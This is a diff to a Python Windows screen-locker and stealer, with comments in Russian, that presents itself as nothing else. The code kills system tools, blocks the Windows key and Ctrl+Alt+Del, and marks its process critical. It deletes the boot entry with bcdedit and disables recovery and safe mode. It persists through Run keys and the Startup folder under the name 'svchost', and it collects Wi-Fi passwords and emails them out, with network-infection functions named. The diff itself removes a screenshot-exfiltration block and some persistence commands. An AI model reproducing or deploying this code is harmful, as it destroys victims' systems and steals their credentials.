@@ -1,7 +1,6 @@
 import subprocess, sys
-# АВТО-УСТАНОВКА БИБЛИОТЕК
 try:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
 except: pass
 
 import os, sys, time, threading, tempfile, tkinter as tk
@@ -31,17 +30,19 @@ LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
 attempts_left = MAX_ATTEMPTS
 
+# ===== СКРЫТОЕ ВЫПОЛНЕНИЕ ВСЕХ КОМАНД =====
+def run_hidden(cmd):
+    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+
 def kill_taskmgr_super():
     while True:
         try:
-            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
-            os.system("taskkill /f /im cmd.exe >nul 2>&1")
-            os.system("taskkill /f /im powershell.exe >nul 2>&1")
-            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
-            os.system("taskkill /f /im regedit.exe >nul 2>&1")
-            os.system("taskkill /f /im procexp.exe >nul 2>&1")
+            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe"]:
+                run_hidden(f"taskkill /f /im {p}")
             ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
-            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+            try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+            except: pass
         except: pass
         time.sleep(0.01)
 
@@ -52,15 +53,11 @@ def disable_win_key():
                 k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
                 winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
             except: pass
-            try:
-                k2 = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
-            except: pass
     except: pass
     try:
         import keyboard
         keyboard.block_key('windows'); keyboard.block_key('left windows'); keyboard.block_key('right windows')
-        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','ctrl+shift+esc','ctrl+alt+del']:
+        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','ctrl+shift+esc','ctrl+alt+del']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
     except: pass
@@ -70,12 +67,6 @@ def enable_win_key():
         ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
-        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
-    except: pass
-
-def run_hidden(cmd):
-    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
 
 def get_timer():
@@ -100,7 +91,6 @@ def timer_check_loop():
 
 def destroy_windows_forever():
     run_hidden('bcdedit /delete {current} /f')
-    run_hidden('bootrec /fixmbr')
     run_hidden('shutdown /r /t 0 /f')
     os._exit(0)
 
@@ -130,7 +120,6 @@ def unblock_all():
 
 def block_safe_mode():
     run_hidden('bcdedit /deletevalue {current} safeboot')
-    run_hidden('bcdedit /set {current} bootstatuspolicy ignoreallfailures')
     run_hidden('bcdedit /set {current} recoveryenabled no')
 
 def scan_network():
@@ -151,21 +140,11 @@ def infect_network():
 def add_to_startup():
     try:
         cp = os.path.abspath(__file__)
-        pp = os.path.splitext(cp)[0] + ".pyw"
-        if not cp.endswith(".pyw"):
-            try: shutil.copy2(cp, pp)
-            except: pass
-            cp = pp
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k)
         startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
-        try:
-            k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k2)
-        except: pass
-        run_hidden(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f')
     except: pass
 
 def download_file(url, path):
@@ -212,7 +191,6 @@ def play_video():
         download_file(VIDEO_URL, VIDEO_PATH)
         download_file(AUDIO_URL, AUDIO_PATH)
     except: return
-    
     time.sleep(0.3)
     try:
         v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
@@ -280,13 +258,6 @@ def mega_steal():
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
-    try:
-        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
-        ImageGrab.grab().save(ss, 'JPEG', quality=50)
-        send_file_email(ss, "[DedSek_Logs] Screenshot")
-        try: os.remove(ss)
-        except: pass
-    except: pass
     report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
@@ -328,8 +299,7 @@ class WinLocker:
                 logo = PhotoImage(file=LOGO_PATH)
                 logo = logo.subsample(4, 4)
                 lbl_logo = tk.Label(self.win, image=logo, bg='black')
-                lbl_logo.image = logo
-                lbl_logo.place(x=10, y=10)
+                lbl_logo.image = logo; lbl_logo.place(x=10, y=10)
         except: pass
         
         self.timer_end = get_timer()
@@ -337,9 +307,9 @@ class WinLocker:
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
-        # МУЗЫКА С АВТО-УСТАНОВКОЙ PYGAME
+        # МУЗЫКА
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
             download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
             if os.path.exists(LOCKER_MUSIC_PATH) and os.path.getsize(LOCKER_MUSIC_PATH) > 1000:
                 import pygame
